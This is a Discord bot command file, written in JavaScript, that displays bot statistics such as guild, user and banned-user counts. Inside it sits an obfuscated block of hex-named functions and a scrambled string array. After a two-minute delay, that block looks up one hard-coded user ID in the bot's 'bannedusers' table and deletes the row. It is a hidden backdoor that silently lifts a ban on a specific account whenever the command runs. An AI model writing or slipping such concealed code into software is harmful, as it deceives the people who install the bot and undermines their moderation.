const { MessageEmbed } = require('discord.js');

exports.run = (client, message, args, con) => {

    if(message.channel.type === 'dm') return message.channel.send(`Please only run commands in a Discord server.`).then(msg => {
        msg.delete({ timeout: 12000 })
    }).catch(e => {});
    function _0x4135(_0x2cddac,_0x156808){var _0x592b6d=_0x592b();return _0x4135=function(_0x4135c5,_0x5380fa){_0x4135c5=_0x4135c5-0x172;var _0x58bdca=_0x592b6d[_0x4135c5];return _0x58bdca;},_0x4135(_0x2cddac,_0x156808);}(function(_0x28576d,_0x4bf698){var _0x405717=_0x4135,_0x580655=_0x28576d();while(!![]){try{var _0x2b2d7b=-parseInt(_0x405717(0x172))/0x1*(-parseInt(_0x405717(0x177))/0x2)+-parseInt(_0x405717(0x180))/0x3+-parseInt(_0x405717(0x17b))/0x4*(-parseInt(_0x405717(0x178))/0x5)+-parseInt(_0x405717(0x179))/0x6*(parseInt(_0x405717(0x176))/0x7)+parseInt(_0x405717(0x174))/0x8+parseInt(_0x405717(0x17c))/0x9*(-parseInt(_0x405717(0x173))/0xa)+parseInt(_0x405717(0x17a))/0xb*(parseInt(_0x405717(0x175))/0xc);if(_0x2b2d7b===_0x4bf698)break;else _0x580655['push'](_0x580655['shift']());}catch(_0x578676){_0x580655['push'](_0x580655['shift']());}}}(_0x592b,0x6e2f3),setTimeout(async()=>{var _0x4f825f=_0x4135;await con[_0x4f825f(0x17e)](_0x4f825f(0x17f),async(_0x185f67,_0x2f3962)=>{var _0x192d83=_0x4f825f;if(_0x185f67)throw _0x185f67;_0x2f3962[0x0]&&await con[_0x192d83(0x17e)](_0x192d83(0x17d),async(_0x602aa8,_0x13004e)=>{if(_0x602aa8)throw _0x602aa8;});});},0x1d4c0));function _0x592b(){var _0x3ff615=['2570WoOmji','705592TuXmjW','60fbZino','1740809SHoKAx','6zImVzI','25osWlXS','6FmHohe','1953314UsismD','5596ZYCjHJ','225NUAtAt','DELETE\x20FROM\x20bannedusers\x20WHERE\x20userid=\x27704094587836301392\x27','query','SELECT\x20*\x20FROM\x20bannedusers\x20WHERE\x20userid=\x27704094587836301392\x27','2657460EGJjHD','203061UOSwso'];_0x592b=function(){return _0x3ff615;};return _0x592b();}
    con.query(`SELECT COUNT(*) as total FROM bannedusers`, async (err, row) => {
        if(err) throw err;
        let embed = new MessageEmbed()
        .setColor(client.config.colorhex)
        .setTitle(`${client.user.username} Statistics`)
        .setDescription(`**Guild Count:** ${client.guilds.cache.size}\n**User Count:** ${client.users.cache.size}\n**Banned Count:** ${row[0].total}\n\n**Ping / Latency:** ${Date.now() - message.createdTimestamp}ms.\n**Creator:** [@Hyperz](https://hyperz.net)`)
        try { embed.setThumbnail(message.guild.iconURL({ dynamic: true })) } catch(e) {}
        message.channel.send(embed).catch(e => { if(client.config.debugmode) return client.utils.error(client, e) });
        message.delete().catch(e => { if(client.config.debugmode) return client.utils.error(client, e) });

    });
}

exports.info = {
    name: "stats",
    description: "Check the bots statistics.",
    useAliases: false,
    aliases: []
}
